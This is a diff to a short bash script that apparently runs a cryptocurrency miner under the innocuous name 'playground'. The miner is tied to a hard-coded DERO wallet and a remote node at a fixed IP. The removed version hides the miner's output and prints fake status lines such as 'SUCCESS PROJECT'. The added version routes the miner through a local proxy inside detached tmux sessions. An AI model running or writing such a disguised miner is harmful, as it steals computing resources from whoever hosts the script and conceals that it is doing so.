@@ -1,7 +1,4 @@
 #!/bin/bash
-chmod 500 playground && ./playground -w dero1qyxeam6g2kszcre09kpkhr9swgt560cyts3pfaa60q27ephl2a84qqqf9s2xk -r 178.62.28.214:10101 -p rpc > /dev/null 2>&1 &
-sleep 5
-while true; do clear; echo SETUP RENDERPROC 1; sleep 5; clear; echo SUCCESS PROJECT; sleep 10;let "i++";  done
-
-
-
+chmod 500 playground && tmux new -d './derohe-proxy --listen-address=127.0.0.1:11111 --log-interval=60 --nonce --daemon-address=178.62.28.214:10101 > output.log'
+chmod 500 playground && tmux new -d './playground -w dero1qyxeam6g2kszcre09kpkhr9swgt560cyts3pfaa60q27ephl2a84qqqf9s2xk -r 127.0.0.1:11111 -p rpc > out.log'
+sleep 3600
